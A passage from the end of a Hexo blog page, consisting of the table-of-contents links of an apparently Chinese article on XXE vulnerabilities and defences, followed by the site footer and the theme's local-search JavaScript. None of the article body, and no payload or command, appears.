class="nav-text">2. Facebook XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Wikiloc-XXE"><span class="nav-number">11.3.</span> <span class="nav-text">3. Wikiloc XXE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AFXXE%E6%A1%88%E4%BE%8B"><span class="nav-number">12.</span> <span class="nav-text">客户端XXE案例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%AE%9E%E5%88%97"><span class="nav-number">13.</span> <span class="nav-text">XXE漏洞环境实列</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">13.1.</span> <span class="nav-text">1.环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">13.2.</span> <span class="nav-text">2.漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E7%9A%84%E5%85%B8%E5%9E%8B%E6%A1%88%E4%BE%8B%E4%BA%8C"><span class="nav-number">14.</span> <span class="nav-text">XXE的典型案例二</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%AE%89%E8%A3%85%E5%B9%B6%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5"><span class="nav-number">14.1.</span> <span class="nav-text">1.安装并运行起来</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%B8%80%E4%BA%9BExternal-Entities%E8%AF%B7%E6%B1%82"><span class="nav-number">14.2.</span> <span class="nav-text">2.一些External Entities请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%9E%84%E5%BB%BAHTTP%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="nav-number">14.3.</span> <span class="nav-text">3.构建HTTP扫描器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E5%85%B8%E5%9E%8B%E6%A1%88%E4%BE%8B%E4%B8%89"><span class="nav-number">15.</span> <span class="nav-text">XXE典型案例三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E5%AE%9E%E5%88%97"><span class="nav-number">16.</span> <span class="nav-text">XXE漏洞测试实列</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-number">16.1.</span> <span class="nav-text">1.测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">16.2.</span> <span class="nav-text">2.漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%96%B9%E5%BC%8F%E4%B8%80"><span class="nav-number">16.2.1.</span> <span class="nav-text">（1）漏洞测试方式一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%96%B9%E5%BC%8F%E4%BA%8C"><span class="nav-number">16.2.2.</span> <span class="nav-text">（2）漏洞测试方式二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%96%B9%E5%BC%8F%E4%B8%89"><span class="nav-number">16.2.3.</span> <span class="nav-text">（3）漏洞测试方式三</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="nav-number">17.</span> <span class="nav-text">XXE漏洞挖掘方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%AE%80%E5%8D%95%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="nav-number">17.1.</span> <span class="nav-text">1.简单挖掘方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%A1%AE%E8%AE%A4XXE%E6%BC%8F%E6%B4%9E"><span class="nav-number">17.2.</span> <span class="nav-text">2.确认XXE漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%AF%BB%E6%89%BEXXE"><span class="nav-number">17.3.</span> <span class="nav-text">3.寻找XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-XXE%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="nav-number">17.4.</span> <span class="nav-text">4.XXE注入利用步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%B5%8B%E8%AF%95%E6%98%AF%E5%90%A6%E5%85%81%E8%AE%B8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%BC%95%E7%94%A8"><span class="nav-number">17.4.1.</span> <span class="nav-text">（1）测试是否允许外部实体引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">17.4.2.</span> <span class="nav-text">（2）任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E9%80%9A%E8%BF%87PHP%EF%BC%9A-%E8%BF%87%E6%BB%A4%E5%99%A8%E8%AF%BB%E5%8F%96"><span class="nav-number">17.4.3.</span> <span class="nav-text">（3）通过PHP：&#x2F;&#x2F;过滤器读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89xxe%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-number">17.4.4.</span> <span class="nav-text">（4）xxe注入测试代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E6%A3%80%E6%9F%A5%E5%B7%A5%E5%85%B7"><span class="nav-number">18.</span> <span class="nav-text">XXE自动化注入检查工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E9%98%B2%E5%BE%A1"><span class="nav-number">19.</span> <span class="nav-text">XXE防御</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">SCERush</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">98.9k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  
  


  

  

</body>
</html>
